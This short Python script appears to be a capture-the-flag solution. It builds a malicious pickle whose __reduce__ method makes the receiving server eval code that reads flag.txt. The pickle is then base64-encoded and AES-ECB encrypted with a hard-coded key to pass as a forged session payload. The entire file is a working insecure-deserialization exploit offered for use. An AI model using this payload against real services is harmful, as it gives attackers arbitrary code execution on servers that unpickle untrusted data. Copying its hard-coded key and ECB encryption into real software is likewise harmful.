import pickle, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def encrypt(data):
    cipher = AES.new("36f6d9a966c4478c73af4fde2f813212", AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

class WebcomeExploit:
    def __reduce__(self):
        cmd = "open('./flag.txt', 'r').read()"
        return (__builtins__.eval, (cmd,))


data = {'name': WebcomeExploit(), 'userid': 'modori205', 'password': '123456'}
payload = encrypt(base64.b64encode(pickle.dumps(data)).decode('utf8'))
print(payload)

